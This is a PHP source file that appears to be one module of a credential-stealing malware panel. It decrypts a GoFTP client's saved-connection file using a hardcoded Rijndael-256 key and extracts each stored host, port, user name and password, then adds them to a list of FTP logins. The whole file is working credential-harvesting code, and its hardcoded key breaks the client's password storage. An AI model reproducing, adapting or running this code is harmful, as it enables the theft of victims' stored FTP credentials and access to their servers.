<?php
class Module_goftp extends Module_
{
    private function decrypt($Password)
    {
        if (!strlen($Password))
            return '';

        $decoded_data = hex2bin($Password);
        if ($decoded_data === false)
        {
            return '';
        }

        $iv = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
        $key = "Goftp Rocks 91802sfaiolpqikeu39";
        $decrypted_data = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $decoded_data, MCRYPT_MODE_ECB, $iv);

        if (!strlen($decrypted_data))
        {
            return '';
        }

        $real_len = Int32(substr($decrypted_data, 0, 4));

        $Result = substr($decrypted_data, 4, $real_len);
        if (strlen($Result) != $real_len)
        {
            return '';
        }

        return $Result;
    }

    protected function ProcessFile($file_contents)
    {
        if (strlen($file_contents) <= 4)
            return;

        $lines = parse_lines($file_contents);

        if (is_array($lines) && count($lines) > 1)
        {
            array_shift($lines);
            foreach ($lines as $line)
            {
                $line = $this->decrypt($line);
                $pos = strrpos($line, '<FS>');
                if ($pos !== false)
                {
                    $line = substr($line, $pos+4);
                    if (strlen($line))
                    {
                        $ftp_settings = explode('~~~', $line);
                        if (is_array($ftp_settings) && count($ftp_settings) > 5)
                        {
                            $Host = Assign_($ftp_settings[0]);
                            $Port = Assign_($ftp_settings[1]);
                            $User = Assign_($ftp_settings[2]);
                            $Pass = Assign_($ftp_settings[3]);
							
                            if (count($ftp_settings) > 10)
                                $Prot = $ftp_settings[10];
                            else
                                $Prot = '';

                            if($Pass != "anon@microsoft.com")
                                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 'SFTP - SSH2 encryption'), $Port), $User, $Pass);
                        }
                    }
                }
            }
        }
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessFile($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

